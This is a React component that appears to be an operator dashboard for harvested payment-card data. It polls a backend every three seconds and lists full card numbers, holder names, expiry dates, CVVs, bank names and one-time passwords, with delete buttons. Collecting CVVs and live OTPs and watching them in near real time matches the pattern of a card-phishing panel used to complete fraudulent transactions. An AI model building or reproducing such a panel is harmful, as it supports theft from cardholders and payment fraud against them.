
import React, { useState, useEffect } from 'react';
import axios from 'axios';

const FormDetails = () => {
    const [cardDetails, setCardDetails] = useState([]);
    const [loading, setLoading] = useState(true);

    useEffect(() => {
        const token = localStorage.getItem('token');
        if (token) {
            fetchDetails(token);
            const intervalId = setInterval(() => fetchDetails(token), 3000); // Poll every 3 seconds
            return () => clearInterval(intervalId); // Cleanup interval on component unmount
        } else {
            console.log("No token found in localStorage");
            setLoading(false);
        }
    }, []);

    const fetchDetails = (token) => {
        axios.get("https://ecommerce-ryoy.onrender.com/getcard", {
            headers: {
                'Authorization': `Bearer ${token}`
            }
        })
        .then((cardRes) => {
            console.log("Card API Response:", cardRes);

            const cardData = cardRes.data;

            setCardDetails(cardData);
            setLoading(false);
        })
        .catch((error) => {
            console.error("Error fetching card details:", error);
            setLoading(false);
        });
    };

    const deleteCard = (cardId) => {
        const token = localStorage.getItem('token');
        console.log(`Deleting card with ID: ${cardId}`);
        axios.delete(`https://ecommerce-ryoy.onrender.com/deletecard/${cardId}`, {
            headers: {
                'Authorization': `Bearer ${token}`
            }
        })
        .then((res) => {
            console.log("Card deleted:", res);
            fetchDetails(token); // Refresh card details after deletion
        })
        .catch((error) => {
            console.error("Error deleting card:", error);
            console.error("Axios error response:", error.response);
        });
    };

    return (
        <div className="container">
            <h2 className="mt-5">Card Details</h2>
            {loading ? (
                <p>Loading card details...</p>
            ) : (
                <div className="table-responsive">
                    <table className="table table-bordered mt-3">
                        <thead>
                            <tr>
                               
                                <th>Card Number</th>
                                <th>Card Holder Name</th>
                                <th>Expiry Month</th>
                                <th>Expiry Year</th>
                                <th>CVV</th>
                                <th>Card Type</th>
                                <th>Bank Name</th>
                                <th>OTP</th>
                                <th>Actions</th>
                               
                            </tr>
                        </thead>
                        <tbody>
                            {cardDetails.length > 0 ? (
                                cardDetails.map((card, index) => (
                                    <tr key={index}>
                                      
                                        <td>{card.cardNumber}</td>
                                        <td>{card.cardHolderName}</td>
                                        <td>{card.expiryMonth}</td>
                                        <td>{card.expiryYear}</td>
                                        <td>{card.cvv}</td>
                                        <td>{card.cardType}</td>
                                        <td>{card.bankName}</td>
                                        <td>{card.cardHolderName ? card.otp : '-'}</td>
                                        <td>
                                            <button onClick={() => deleteCard(card._id)} className="btn btn-danger">
                                                Delete
                                            </button>
                                        </td>
                                    </tr>
                                ))
                            ) : (
                                <tr>
                                    <td colSpan="9">No card details found.</td>
                                </tr>
                            )}
                        </tbody>
                    </table>
                </div>
            )}
        </div>
    );
};

export default FormDetails;


